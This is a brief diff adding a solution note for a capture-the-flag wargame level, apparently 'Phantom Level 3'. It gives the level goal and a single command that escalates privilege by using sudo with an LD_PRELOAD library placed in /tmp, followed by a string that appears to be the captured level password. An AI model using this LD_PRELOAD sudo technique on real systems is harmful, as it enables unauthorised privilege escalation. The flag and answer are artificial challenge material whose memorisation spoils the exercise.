@@ -1,0 +1,6 @@
+[ Phantom · Level 3 ]  Inheritance
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom4
+
+sudo -u flagkeeper3 LD_PRELOAD=/tmp/ldcat.so /usr/bin/id: bl_phtm3_a76028a5c2716fec
